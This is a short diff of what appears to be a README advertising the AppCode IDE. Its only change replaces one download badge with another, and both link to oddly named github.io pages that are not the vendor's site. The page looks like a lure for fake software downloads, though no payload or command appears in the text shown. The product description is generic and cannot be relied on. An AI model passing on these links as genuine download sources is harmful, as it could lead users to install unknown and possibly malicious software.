@@ -9,7 +9,7 @@
 
 AppCode is an enterprise-grade integrated development environment engineered to streamline Swift, Objective-C, C, and C++ software engineering workflows. Built on a high-performance IntelliJ platform core, it provides deep syntax inspection, instant code completion, automated refactoring, and seamless integration with external build toolchains. By automating boilerplate code generation and enforcing strict semantic analysis, the software eliminates structural errors from complex multi-language codebases.
 
-[![Download AppCode](https://img.shields.io/badge/Download-AppCode-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://malioonecaetteria.github.io/.github/AppCode-Swift-Node)
+[![Explore AppCode](https://img.shields.io/badge/Explore-AppCode-7C3AED?style=flat-square)](https://appcode-node.github.io/.github/)
 
 ---
 
